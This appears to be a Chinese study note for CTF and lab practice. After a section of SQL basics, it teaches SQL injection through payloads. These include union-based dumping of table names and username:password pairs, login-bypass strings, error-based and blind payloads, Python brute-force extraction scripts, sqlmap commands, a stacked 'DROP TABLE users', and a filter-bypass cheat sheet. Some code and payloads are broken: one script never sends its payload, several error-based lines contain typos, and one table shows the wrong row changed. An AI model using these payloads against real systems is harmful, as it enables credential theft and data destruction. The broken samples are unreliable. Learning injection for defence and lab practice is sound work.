[TOC]


## SQL基础

### 一、数据库的基本概念

- 什么是**数据库（Database）**

  一个**存储和管理数据的容器**，比如：学生信息管理系统的核心。

- 什么是**表（Table）**

​ 数据库中**用于存储数据的结构化格式**，每张表有若干“行”和“列”。

- 行（Row）和列（Column）的区别

  - 一行：表示一条记录（例如一个学生）

  - 一列：表示一个字段（例如“姓名”字段）

### 二、SQL基础语法

##### 1. SELECT语句 - 查询数据

`select [列名/*] from [表名] where [限制条件]`

示例：

`select * from students;`

假设students表：

| **id** | **name** | **age** |
| ------ | -------- | ------- |
| 1      | Alice    | 18      |
| 2      | Bob      | 19      |

查询 age = 18 的所有同学的姓名

`SELECT name FROM students WHERE age = 18;`

##### 2. INSERT语句 - 插入数据

`insert into students(name, age) values ('Sunny', 20)`

| **id** | **name** | **age** |
| ------ | -------- | ------- |
| 1      | Alice    | 18      |
| 2      | Bob      | 19      |
| 3      | Sunny    | 20      |

##### 3. UPDATE语句 - 修改数据

`update students set age = 17 where name = 'Bob';`

| **id** | **name** | **age** |
| ------ | -------- | ------- |
| 1      | Alice    | 17      |
| 2      | Bob      | 19      |
| 3      | Sunny    | 20      |

##### 4. DELETE语句 - 删除数据

`delete from students where age < 18;`

| **id** | **name** | **age** |
| ------ | -------- | ------- |
| 2      | Bob      | 19      |
| 3      | Sunny    | 20      |

##### 5. ALTER语句 - 修改数据

添加新列（Add Column）：

```sql
ALTER TABLE students ADD email VARCHAR(100);
```

修改已有列的数据类型或名称：

```sql
ALTER TABLE students MODIFY age VARCHAR(10);
```

修改字段名称（MySQL >= 8）：

```sql
ALTER TABLE students RENAME COLUMN age TO student_age;
```

删除列（Drop Column）：

```sql
ALTER TABLE students DROP COLUMN email;
```

添加约束（如主键、唯一等）：

```sql
ALTER TABLE students ADD CONSTRAINT unique_name UNIQUE (name);
```

重命名整张表：

```sql
RENAME TABLE students TO student_info;
```

### 三、表结构修改基础

##### 1. 创建表

```sql
CREATE TABLE students (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(50),
  age INT
);
```

##### 2. 常见的约束（Constraints）

- PRIMARY KEY：主键，唯一且不为空（一般为id、学号等唯一标识）
- AUTO_INCREMENT：自动增长（一般用于 ID）
- NOT NULL：不能为空
- UNIQUE：字段唯一

### 四、练习

**题目1：**创建一个名为books的表，包含以下字段：

- id（自动增长主键）
- title（字符串，最多100字符）
- author（字符串）
- price（整数）

```sql
CREATE TABLE books (
  id INT PRIMARY KEY AUTO_INCREMENT,
  title VARCHAR(100),
  author VARCHAR(50),
  price INT
);
```

**题目2**：插入两条书籍记录

```sql
INSERT INTO books (title, author, price) VALUES ('SQL入门教程', '张三', 45);
INSERT INTO books (title, author, price) VALUES ('数据库设计', '李四', 60);
```

**题目3**：查找价格大于50的书

```sql
SELECT * FROM books WHERE price > 50;
```

## SQL注入漏洞

### 漏洞成因

SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库原有信息泄露、篡改，甚至被删除。

将恶意 SQL 语句插入到应用程序的输入中并提交到后台数据库执行的攻击方式。

**示例**

假设你有一个简单的登录逻辑，处理方式如下：

```php
$username = $_GET['username'];
$password = $_GET['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

若用户输入：

```
username = admin
password = ' OR '1'='1
```

则拼接结果变为：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

SQL解析器会判断：

```sql
username = 'admin' AND password = ''（false） OR '1'='1'（true）
```

```sql
username = 'admin' AND (true)
```

> 最终整体条件为 true，**绕过验证**，导致攻击者可以以admin身份登录

### 注入分类（按注入点数据类型）

#### 1. 字符型注入

输入点为字符串类型

```sql
select * from xxx where id = '%s' ;
select * from xxx where id = "%s" ;
select * from xxx where id = ('%s') ;
select * from xxx where id = ("%s") ;
```

#### 2. 数值型注入

```sql
select * from xxx where id = %s ;
```

### 注入分类（按攻击类型）

#### 1. 基于Union的注入

> **基于 UNION 的 SQL 注入（Union-based Injection）** 是一种通过 UNION SELECT 语句将攻击者构造的数据结果与原查询结果合并，从而实现数据泄露的攻击方式。

它的本质是：

> 将恶意查询语句和原始查询通过 UNION 拼接，最终数据库会一起返回两部分的结果。

- ##### UNION SELECT的语法基础

```sql
SELECT column1, column2 FROM table1
UNION
SELECT columnA, columnB FROM table2;
```

**条件：UNION 两侧的列数必须一致**

```sql
select * FROM students where id = 1 union select 1,'admin',20;
```

- ##### payload

步骤：

```sql
?id=1'                              
-- [步骤1] 测试是否存在注入点：传入一个闭合引号，若报错，说明后端存在 SQL 拼接，可能可注入

?id=1'-- -                          
-- [步骤2] 尝试闭合语句 + 注释掉后续内容：验证是否能成功构造注入，页面是否正常回显

?id=1' order by n-- -              
-- [步骤3] 使用 order by 测试列数：逐个尝试 n=1,2,3...，直到报错，说明字段数为 n-1

?id=-1' union select 1,2,3-- -     
-- [步骤4] 探测回显位置：使用和目标列数相同的虚构查询，查看哪个数字在页面中显示，即是可利用的回显位

?id=-1' union select 1,2,database()-- - 
-- [步骤5] 利用回显点显示当前数据库名，database() 是 MySQL 中获取当前库名的函数

?id=-1' union select 1,2,group_concat(table_name) 
from information_schema.tables where table_schema=database()-- -
-- [步骤6] 利用 group_concat() 把当前数据库下所有表名拼接起来，通过回显位一次性展示出来
-- information_schema.tables 是系统表，table_schema=database() 表示只查当前数据库

?id=-1' union select 1,2,group_concat(column_name) 
from information_schema.columns where table_name='XXX'-- -
-- [步骤7] 查找指定表（如 'users'）中所有的字段名（如 username、password 等），并拼接显示

?id=-1' union select 1,2,group_concat(username,0x3a,password) from XXX-- -
-- [步骤8] 从目标表中查询字段内容，0x3a 是十六进制的 “:”（冒号），用于分隔用户名和密码
-- group_concat() 把多行拼成一行，便于在一个回显位中查看多个值
```

#### 2. 万能密码

**场景：登录页面**

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

**注入方式**

万能密码输入示例：

```sql
用户名：admin
密码：' OR '1'='1
```

最终SQL语句：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

因为 '1'='1' 永远为真，整条语句就绕过了密码验证。

**万能密码写法：**

```sql
' OR 1=1--      ← 最经典的写法
' OR 'a'='a'--  ← 同理
' OR 'a'='a     ← 直接闭合语句中原有的单引号
admin'--        ← 若用户名字段也可注入
```

#### 3. 报错注入

> 报错注入是利用数据库在执行非法或逻辑错误的 SQL 表达式时主动抛出的报错信息，将敏感信息写入报错内容中，从而实现数据泄露。

**示例演示过程（基于 MySQL）**

```sql
SELECT * FROM users WHERE id = '$id';
```

当我们输入`?id=1'`

页面报错：`You have an error in your SQL syntax`

说明存在报错注入利用可能性。

**报错注入示例 Payload**

1. **基于 updatexml() 的报错注入**

```sql
?id=1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- -
```

- updatexml() 是 MySQL 的 XML 函数
- concat() 用于拼接字符串：0x7e 是 `~`
- 最终构造非法 XML，触发报错，错误中就会包含 ~当前数据库名~

页面可能报错如下：

```
XPATH syntax error: '~dvwa~'
```

![image-20250628095606069](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628095606069.png)

2. **基于 extractvalue() 的报错注入**

```sql
?id=1' and extractvalue(1, concat(0x7e, (select table_name from information_schema.tables limit 1), 0x7e));
```

- extractvalue() 解析 XPath 的 XML 字符串，也会抛出错误

![image-20250628095707198](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628095707198.png)

3. **基于 floor(rand()\*2) 报错（信息泄露型）**

```sql
?id=1' and (select 1 from (select count(*), concat((select version()), floor(rand(0)*2)) x from information_schema.tables group by x) y)-- -
```

- 利用 group by + rand() 重复值触发 “Duplicate entry” 报错
- 报错中包含数据库版本号

![image-20250628095751221](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628095751221.png)

```sql
# 通过floor报错,注入语句如下:
and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
 
# 通过ExtractValue报错,注入语句如下:
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
 
# 通过UpdateXml报错,注入语句如下:
and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))
 
# 通过NAME_CONST报错,注入语句如下:
and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
 
# 通过join报错,注入语句如下:
select * from(select * from mysql.user ajoin mysql.user b)c;
 
# 通过exp报错,注入语句如下:
and exp(~(select * from (select user () ) a) );
 
# 通过GeometryCollection()报错,注入语句如下:
and GeometryCollection(()select *from(select user () )a)b );
 
# 通过polygon ()报错,注入语句如下:
and polygon (()select * from(select user ())a)b );
 
# 通过multipoint ()报错,注入语句如下:
and multipoint (()select * from(select user() )a)b );
 
# 通过multlinestring ()报错,注入语句如下:
and multlinestring (()select * from(selectuser () )a)b );
 
# 通过multpolygon ()报错,注入语句如下:
and multpolygon (()select * from(selectuser () )a)b );
 
# 通过linestring ()报错,注入语句如下:
and linestring (()select * from(select user() )a)b );
```

报错注入：

[最常见的SQL报错注入函数（floor、updatexml、extractvalue）及payload总结](https://blog.csdn.net/Myon5/article/details/135184385)

[SQL报错注入详解](https://cloud.tencent.com/developer/article/2168996)

[十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)

#### 常用函数说明

| **函数**             | **功能**           |
| -------------------- | ------------------ |
| database()           | 当前数据库名       |
| user()               | 当前数据库用户     |
| version()            | 数据库版本         |
| @@datadir            | 数据库存储路径     |
| @@version_compile_os | 数据库操作系统信息 |

#### 4. 盲注

> “盲注” = **没有明显报错信息，也没有数据直接回显**。但后端依旧执行了 SQL 查询，可以通过**页面变化或延迟行为**来判断结果真假。

#### 布尔盲注（Boolean-Based Blind SQLi）

> 构造 SQL 语句，使返回结果依据布尔表达式的真假而不同，页面内容会有细微差别（如显示文字、状态码、长度），通过这些判断结果。

##### 示例

构造判断数据库名首字母是不是 **“d”**（假设是 dvwa）：

```sql
?id=1' and substr(database(),1,1)='d'-- -
```

- 如果返回和正常页面一致：表示为真
- 如果显示空白或不同：表示为假
- 然后逐位猜测，得出 database() = dvwa

payload示例：

```sql
?id=1' and length(database())=4-- -
?id=1' and ascii(substr(database(),1,1))=100-- -   // 判断首字母是否为 d
```

#### 时间盲注（Time-Based Blind SQLi）

> 当页面回显完全一致时，无法通过“布尔变化”判断真假，我们让服务器 **“休眠几秒”来作为真假判断依据**。

```
IF(条件为真, SLEEP(3), 0)
```

如果条件为真时，页面返回内容会有3秒的延时。

```sql
?id=1' and if(substr(database(),1,1)='d', sleep(3), 0)-- -
```

- 若数据库以 d 开头，页面会延迟 3 秒返回
- 若不为 d，立即返回

利用这个特性，可以用脚本**逐字符**猜测数据库名、表名、字段名、内容等。

```sql
?id=1' and if(length(database())=4, sleep(3), 0)-- -
?id=1' and if(ascii(substr(database(),1,1))=100, sleep(3), 0)-- -
```

##### 自动化工具

sqlmap 工具（支持盲注全自动测试）

```shell
sqlmap -u "http://target.com/?id=1" --technique=B --batch
sqlmap -u "http://target.com/?id=1" --technique=T --batch
```

##### 盲注payload顺序示例：

```sql
# 布尔盲注
?id=1' and 1=1-- -     -- 页面正常
?id=1' and 1=2-- -     -- 页面变化或空白
# 时间盲注
?id=1' and sleep(3)-- -    -- 页面延迟返回（等待3秒）
?id=1' and 1=1-- -         -- 页面立刻返回
```

```sql
# 布尔盲注
?id=1' and length(database())=1-- -
?id=1' and length(database())=2-- -
# 时间盲注
?id=1' and if(length(database())=1, sleep(3), 0)-- -
?id=1' and if(length(database())=2, sleep(3), 0)-- -
```

```sql
# 布尔盲注
?id=1' and ascii(substr(database(),1,1))=97-- -
?id=1' and ascii(substr(database(),2,1))=97-- -
# 时间盲注
?id=1' and if(ascii(substr(database(),1,1))=97, sleep(3), 0)-- -
?id=1' and if(ascii(substr(database(),2,1))=97, sleep(3), 0)-- -
```

#### 盲注总结：构造关键函数

| **函数**              | **作用说明**          |
| --------------------- | --------------------- |
| length(str)           | 获取字符串长度        |
| substr(str, pos, len) | 截取字符串中某一位    |
| ascii(char)           | 获取字符的 ASCII 编码 |
| sleep(n)              | 延迟 n 秒             |
| if(条件, 真值, 假值)  | 条件判断表达式        |

#### 脚本（通过GPT添加注释与优化）：

```sql
# 布尔盲注
import requests

# ========================
# 配置区
# ========================
URL = "http://127.0.0.1:9999/Less-1/index.php"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
MAX_LEN = 20
TRUE_MARK = "You are in"  # 判断页面是否正常的关键标识
# ========================

# 判断 payload 是否为真
def is_true(payload):
    full_url = f"{URL}?id=1' AND {payload}--+"
    res = requests.get(full_url)
    return TRUE_MARK in res.text

# 猜测数据库名长度
def get_database_length():
    for i in range(1, MAX_LEN + 1):
        payload = f"LENGTH(DATABASE())={i}"
        if is_true(payload):
            print(f"[+] Database name length: {i}")
            return i
    print("[-] Failed to determine database length")
    return 0

# 猜测数据库名内容
def get_database_name(length):
    name = ''
    for pos in range(1, length + 1):
        for ch in CHARSET:
            payload = f"SUBSTR(DATABASE(),{pos},1)='{ch}'"
            if is_true(payload):
                name += ch
                print(f"[+] Found char {pos}: {ch} -> {name}")
                break
    print(f"[✓] Database name: {name}")
    return name

# 主函数
if __name__ == '__main__':
    print("🔍 Boolean-based blind SQLi demo")
    db_len = get_database_length()
    if db_len > 0:
        get_database_name(db_len)
```

```python
# 时间盲注
import requests
import time

# ========================
# 配置区
# ========================
URL = "http://127.0.0.1:9999/Less-1/index.php"
DELAY_THRESHOLD = 2         # 响应延迟阈值（秒）
SLEEP_TIME = 3              # sleep 延迟时间（秒）
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
MAX_DB_LENGTH = 20          # 最大尝试数据库长度
# ========================

# 统一的时间测量函数
def is_delay(payload):
    full_url = f"{URL}?id=1' AND {payload}--+"
    start = time.time()
    requests.get(full_url)
    end = time.time()
    return (end - start) >= DELAY_THRESHOLD

# 猜测数据库名长度
def get_database_length():
    for length in range(1, MAX_DB_LENGTH + 1):
        payload = f"IF(LENGTH(DATABASE())={length}, SLEEP({SLEEP_TIME}), 0)"
        if is_delay(payload):
            print(f"[+] Database name length: {length}")
            return length
    print("[-] Failed to determine length")
    return 0

# 爆破数据库名
def get_database_name(length):
    name = ''
    for pos in range(1, length + 1):
        for ch in CHARSET:
            payload = f"IF(SUBSTR(DATABASE(), {pos}, 1)='{ch}', SLEEP({SLEEP_TIME}), 0)"
            if is_delay(payload):
                name += ch
                print(f"[+] Found char {pos}: {ch} -> {name}")
                break
    print(f"[✓] Database name: {name}")
    return name

# 主函数
if __name__ == '__main__':
    print("🔍 Getting database name length...")
    db_len = get_database_length()
    if db_len > 0:
        print("🔍 Getting database name content...")
        get_database_name(db_len)
```

通过ascii查找

```python
import requests

# 配置
url = "http://127.0.0.1:9999/Less-1/?id="
success_mark = "You are in"

# ========== 通用函数 ==========
def is_true(payload):
    """判断注入是否成功"""
    payload_url = url + payload
    r = requests.get(url)
    return success_mark in r.text

def ascii_range():
    """限制可爆破字符范围"""
    return range(32, 128)  # 可打印字符

# ========== 功能 1：爆破 database() ==========
def leak_database_name():
    name = ""
    print("[*] Start leaking database() name...")
    for pos in range(1, 20):
        for asc in ascii_range():
            payload = "0'/**/or/**/(ascii(substr(database(),{pos},1))={asc})^0;#".format(pos=pos, asc=asc)
            if is_true(payload):
                name += chr(asc)
                print(f"[+] {pos}: {chr(asc)} → {name}")
                break
        else:
            break  # 没有新字符则认为结束
    print(f"[✓] Database name: {name}")
    return name

# ========== 功能 2：爆破表名（可选） ==========
def leak_table_names():
    name = ""
    print("[*] Start leaking table names...")
    for pos in range(1, 100):
        for asc in ascii_range():
            payload = "0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{pos},1))={asc})".format(pos=pos, asc=asc)
            if is_true(payload, post_key="id"):
                name += chr(asc)
                print(f"[+] {pos}: {chr(asc)} → {name}")
                break
        else:
            break
    print(f"[✓] Table names: {name}")
    return name

# ========== 爆破列名、数据内容省略 ==========
  
# ========== 主入口 ==========
if __name__ == "__main__":
    leak_database_name()
    # leak_table_names()
```

#### 5. 二次注入

> **恶意SQL代码并不是在最初输入时就被执行，而是在后续某次对这些数据的读取或拼接中被执行**。

#### 举个例子（注册+登录）：

**场景描述：**

1. 用户注册时，提交用户名：`admin'#`

   服务器保存这个用户名入库（未执行注入，特殊字符被转义）

2. 后台登录模块使用该用户名拼接 SQL 查询：

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

此时变为：

```sql
SELECT * FROM users WHERE username = 'admin'# ' AND password = '123'
```

后半句被注释掉，实现绕过密码验证。

**常见发生位置**

| **场景**             | **说明**                               |
| -------------------- | -------------------------------------- |
| 注册 & 登录分离      | 注册时存入 payload，登录时直接拼接查询 |
| 修改昵称、邮箱等字段 | 存入时做了防护，但修改时直接拼接入语句 |

**sqlilabs靶场示例：**

注册时，输入的内容被转义

![image-20250628104636034](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628104636034.png)

新建用户`admin'#`

![image-20250628104649815](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628104649815.png)

用新建的用户来登录

![image-20250628104702200](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628104702200.png)

由于在更改密码的操作处，没有对username进行过滤，因此此时更改密码的话，则会对admin用户进行更改

![image-20250628104716127](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628104716127.png)

通过查看靶场源码，更新密码时，当用户名为`admin'#`时，sql语句为：

```sql
UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'
```

#### 6. 堆叠注入

> 在一个 SQL 查询语句后添加分号 ;，再拼接并执行另一个独立的 SQL 语句。即，一次请求中同时执行多个 SQL 语句。

例如原本的 SQL 查询是：

```sql
SELECT * FROM users WHERE id = '$id';
```

传入：

```sql
1; DROP TABLE users;
```

最终变为：

```sql
SELECT * FROM users WHERE id = '1'; DROP TABLE users;
```

如果数据库配置允许堆叠执行，就会同时执行两个 SQL 语句。

**使用条件**

| **条件**                 | **说明**                                          |
| ------------------------ | ------------------------------------------------- |
| 数据库支持语句堆叠       | MySQL、MSSQL 支持，SQLite 默认支持，Oracle 不支持 |
| 后端数据库驱动允许堆叠   | 比如 Python 的 pymysql 不允许；MySQLdb 支持       |
| Web 后端没有对分号做过滤 | 分号 `;` 不能被清洗或转义                         |
| 没有限制单条语句         | 某些框架限制单语句执行，无法堆叠                  |

#### 7. 宽字节注入

> 宽字节注入是利用多字节字符编码（如 GBK、BIG5）中**某些字节可以合并转义字符 \ 的特性**，来绕过过滤机制，完成 SQL 注入。

**常见发生场景**

```
Web 后端使用了 addslashes() 或 magic_quotes_gpc 来过滤单引号
→ ' 变成了 \'

正常情况下拼接后变为：' OR 1=1 → \' OR 1=1 → 注入失败
但如果是 GBK 编码下，宽字节字符可能将 \ 和下一个字符一起解释
```

**原理举例**

PHP在开启`magic_quotes_gpc`或者使用`addslashes`、`iconv`等函数的时候，单引号`'`会被转义成`\'`。比如传入字符`%bf'`在满足上述条件的情况下会变成`%bf\'`。其中反斜杠`\`的十六进制编码是`%5C`，单引号`'`的十六进制编码是`%27`，那么就可以得出`%bf\'=%bf%5c%27`。如果程序的默认字符集是GBK等宽字节字符集，则MySQL会认为`%bf%5c`是一个宽字符，也就是`縗`。也就是说`%bf\'=%bf%5c%27=縗'`。

## Bypass姿势

### **空格绕过**

| **绕过方式**   | **示例**                         |
| -------------- | -------------------------------- |
| 使用注释       | `/**/union/**/select/**/1,2,3`   |
| 使用替代空格符 | `+`、`%09`（Tab）、`%0a`（换行） |
| 使用括号拼接   | `union(select(1),2,3)`           |
| 使用尖括号     | `<>union<>select<>1,2,3`         |

### **单引号/双引号绕过**

| **绕过方式**               | **示例**                      |
| -------------------------- | ----------------------------- |
| 使用 char() 编码拼接字符串 | `union select char(97,98,99)` |
| 使用十六进制表示字符串     | `union select 0x61646d696e`   |

### **注释绕过**

**目的：过滤不同注释方式**

| **方式**             | **示例**         |
| -------------------- | ---------------- |
| --+、-- -            | `1' or 1=1 --+`  |
| #                    | `1' or 1=1 #`    |
| /* ... */            | `1/**/or/**/1=1` |
| 直接利用原有符号闭合 | `1' or '1'='1`   |

### **大小写绕过**

**目的：绕过大小写敏感的过滤器**

| **方法**   | **示例**             |
| ---------- | -------------------- |
| 大小写混写 | `UnIoN SeLeCt 1,2,3` |

### **编码绕过（URL编码等）**

**目的：绕过 WAF 或黑名单检测**

| **编码方式** | **示例**                           |
| ------------ | ---------------------------------- |
| URL 编码     | `%27`（单引号 `'`），`%20`（空格） |
| UTF-8 编码   | `%c0%ae`, `%bf%27`（用于宽字节）   |
| Unicode 编码 | `\u0027`（等于 '）                 |

### **关键字替换绕过**

| **替代方式**                   | **示例**                        |
| ------------------------------ | ------------------------------- |
| 拼接字段名                     | `sel/**/ect,` `uni%6Fn`         |
| 使用 information_schema 的别名 | `sys.schema_tables`, `mysql.db` |
| 双写绕过                       | `ununionion`                    |

### **函数型绕过**

| **技巧**           | **示例**                          |
| ------------------ | --------------------------------- |
| char() 拼接字符    | `select char(97,100,109,105,110)` |
| hex() 替代字符串   | `0x61646d696e`                    |
| unhex() 解码字符串 | `unhex('61646d696e')`             |
| MySQL 内联注释     | `/*!select*/`，`/*!union*/`       |

**各种大佬的绕过奇淫技巧众多，多逛优质博客能学到很多。**

## 总结

| **类型**       | **简述**                                | **特点**               |
| -------------- | --------------------------------------- | ---------------------- |
| **联合注入**   | 利用 UNION SELECT 合并结果              | 有回显，快速查库表数据 |
| **报错注入**   | 利用函数触发数据库错误，泄露数据        | 有回显，无需依赖结构   |
| **布尔盲注**   | 根据返回页面变化判断真假                | 无回显，慢             |
| **时间盲注**   | 使用 SLEEP() 判断真假                   | 无回显 + 返回慢        |
| **堆叠注入**   | 一次执行多个 SQL 语句（如 1; DROP ...） | 高危，权限要求高       |
| **宽字节注入** | 利用 GBK 编码绕过转义                   | 特殊环境适用           |
| **二次注入**   | 注入内容先入库，在别处再次执行          | 隐蔽性强               |

### 做题顺序

1. 判断注入点是否存在

尝试输入常见测试值：

- 1'、1--、1' or 1=1 --
- 测试`1' and 1=1`、`1' and 1=2`看是否有报错 / 页面变动，若能通过1=1和1=2控制页面显示，通常就存在注入点

2. 判断字段数（联合注入）

使用 order by n 或 union select 1,2,... 来判断字段数量和回显位置：

```sql
?id=1' order by 3--+  
?id=-1' union select 1,2,3--+
```

3. 识别数据库类型（比赛或做题时可跳过）

- 报错信息或字段特征判断：MySQL / MSSQL / PostgreSQL / Oracle
- 如不明确，可用 SQLMap 帮忙探测

4. 判断是否回显

| **情况** | **接下来的方法**                                     |
| -------- | ---------------------------------------------------- |
| 有回显   | 联合注入（直接回显内容）、报错注入（返回报错信息）   |
| 无回显   | 布尔盲注（页面有不同回显）、时间盲注（页面回显相同） |

5. 常规信息收集（比赛中可跳过）

- 当前数据库名：database()、db_name()等
- 当前用户：user()、system_user()等
- 当前表名：information_schema.tables
- 当前字段名：information_schema.columns

6. 查找敏感数据

```sql
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();

SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users';

SELECT username, password FROM users;
```

### **做题注意事项与技巧**

| **建议**                | **说明**                                                     |
| ----------------------- | ------------------------------------------------------------ |
| 多尝试报错点            | 页面报错可以作为信号触发点，结合函数注入（如 updatexml, extractvalue） |
| 手动构造比 SQLMap 重要  | 训练题目的真正价值在于理解而非跑出 flag                      |
| 绕过黑名单              | 多练、持续学习各种绕过方式方法                               |
| 关注 POST 数据 / Cookie | 注入点可能不在 URL 而在请求体或头部                          |
| 关注 WAF 特征           | 请求变慢、过滤关键词、403 报错可能有 WAF                     |
| 练宽字节 / 二次注入     | 容易出现在进阶题或工作面试问题中                             |
| 熟练写脚本              | 尤其盲注类，Python写个通用爆破器非常关键                     |